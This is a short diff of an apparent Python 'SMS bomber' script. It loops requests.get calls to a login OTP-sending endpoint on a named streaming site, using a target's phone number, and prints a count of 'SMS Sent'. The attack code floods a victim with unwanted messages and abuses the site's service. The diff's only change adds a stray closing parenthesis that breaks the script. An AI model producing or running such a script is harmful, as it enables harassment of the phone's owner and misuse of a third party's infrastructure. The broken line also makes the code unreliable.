@@ -8,4 +8,4 @@ api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operato
 
 for i in range(amount):
 	requests.get(api)
-	print(str(i+1)+" SMS Sent")
+	print(str(i+1)+" SMS Sent"))
